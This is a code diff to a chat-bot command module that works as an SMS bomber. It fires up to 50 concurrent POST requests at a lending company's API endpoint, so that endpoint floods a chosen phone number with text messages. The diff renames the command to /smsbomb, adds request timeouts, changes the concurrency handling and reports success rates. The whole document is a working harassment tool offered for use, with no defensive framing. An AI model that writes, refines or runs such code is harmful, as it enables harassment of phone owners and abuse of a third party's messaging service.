@@ -8,7 +8,7 @@ module.exports.config = {
   credits: "selov",
   description: "Send SMS bomb to phone number",
   commandCategory: "utility",
-  usages: "/sms <phone> [threads]",
+  usages: "/smsbomb <phone> [threads]",
   cooldowns: 30
 };
 
@@ -29,6 +29,7 @@ async function sendBomb(phone, threads = 30) {
     let successes = 0;
     let failures = 0;
     let completed = 0;
+    const totalThreads = threads;
 
     const bombSingleThread = async () => {
       try {
@@ -52,7 +53,7 @@ async function sendBomb(phone, threads = 30) {
         await axios.post(
           'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
           data,
-          { headers }
+          { headers, timeout: 10000 }
         );
 
         successes++;
@@ -63,15 +64,23 @@ async function sendBomb(phone, threads = 30) {
       }
     };
 
-    // Execute all threads concurrently
-    Promise.all(Array(threads).fill().map(() => bombSingleThread()))
-      .then(() => resolve({
-        phone: phone,
-        threads: threads,
-        successes: successes,
-        failures: failures,
-        successRate: ((successes / (successes + failures)) * 100).toFixed(2)
-      }))
+    // Create an array of promises
+    const promises = [];
+    for (let i = 0; i < threads; i++) {
+      promises.push(bombSingleThread());
+    }
+
+    // Wait for all promises to settle
+    Promise.allSettled(promises)
+      .then(() => {
+        resolve({
+          phone: phone,
+          threads: totalThreads,
+          successes: successes,
+          failures: failures,
+          successRate: totalThreads > 0 ? ((successes / totalThreads) * 100).toFixed(2) : "0.00"
+        });
+      })
       .catch(reject);
   });
 }
@@ -87,16 +96,16 @@ module.exports.run = async function ({ api, event, args }) {
     // Validate phone number
     if (!phone) {
       return api.sendMessage(
-        "❌ Please provide a phone number.\n\nUsage: /sms <phone> [threads]\nExample: /sms 09450807xxx 30",
+        "❌ Please provide a phone number.\n\nUsage: /smsbomb <phone> [threads]\nExample: /smsbomb 09450807xxx 30",
         threadID,
         messageID
       );
     }
 
     // Validate threads number
-    if (isNaN(threads) || threads < 1 || threads > 100) {
+    if (isNaN(threads) || threads < 1 || threads > 50) {
       return api.sendMessage(
-        "❌ Threads must be between 1-100.",
+        "❌ Threads must be between 1-50.",
         threadID,
         messageID
       );
@@ -105,8 +114,7 @@ module.exports.run = async function ({ api, event, args }) {
     // Send initial message
     const waiting = await api.sendMessage(
       `📱 **SMS BOMB STARTED**\n━━━━━━━━━━━━━━━━\n📞 Phone: ${phone}\n⚡ Threads: ${threads}\n⏳ Please wait...`,
-      threadID,
-      messageID
+      threadID
     );
 
     // Execute the bomb
@@ -124,7 +132,7 @@ module.exports.run = async function ({ api, event, args }) {
       `💬 Request completed!`;
 
     // Update waiting message
-    api.editMessage(resultMsg, waiting.messageID);
+    await api.editMessage(resultMsg, waiting.messageID);
 
   } catch (err) {
     console.error("SMS Command Error:", err);
